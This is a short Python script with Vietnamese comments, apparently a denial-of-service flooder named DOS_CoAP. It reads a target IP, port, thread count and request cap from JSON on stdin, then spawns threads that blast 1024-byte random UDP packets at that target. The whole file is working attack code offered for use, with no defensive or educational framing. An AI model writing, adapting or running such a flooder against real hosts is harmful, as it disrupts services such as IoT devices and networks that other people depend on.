#!/usr/bin/env python3
# Code by LeeOn123
import random
import socket
import threading
import sys
import json

# Biến cờ để kiểm tra xem chương trình có nên tiếp tục chạy hay không
running = True
request_count = 0

def process_json_input(json_string):
    try:
        # Phân tích chuỗi JSON thành một đối tượng Python
        data = json.loads(json_string)
        # Trả về đối tượng đã được phân tích
        return data
    except json.JSONDecodeError as e:
        # Xử lý trường hợp nếu chuỗi JSON không hợp lệ
        print("Invalid JSON format:", e)
        return None

def DOS_CoAP(ip, port, times, threads, max_requests):
    try:
        def run():
            global running
            global request_count
            while running:  # Sử dụng vòng lặp vô hạn
                if request_count >= max_requests:
                    print("Reached maximum requests. Stopping program.")
                    running = False
                    break
                data = random._urandom(1024)
                i = random.choice(("[*]", "[!]", "[#]"))
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (str(ip), int(port))
                    for x in range(times):
                        s.sendto(data, addr)
                    print(i + " Sent!!!")
                    sys.stdout.flush()
                    request_count += 1
                except:
                    print("[!] Error!!!")
                    sys.stdout.flush()
        for y in range(threads):
            th = threading.Thread(target=run)
            th.start()
    except:
        print("[!] Error Input File")
        sys.stdout.flush()
if __name__ == "__main__":
    json_string = sys.stdin.readline()
    # Xử lý chuỗi JSON thành đối tượng Python
    data = process_json_input(json_string)
    DOS_CoAP(data['ipserver'], int(data['port']), int(data['times']), int(data['threads']), int(data['request']))
       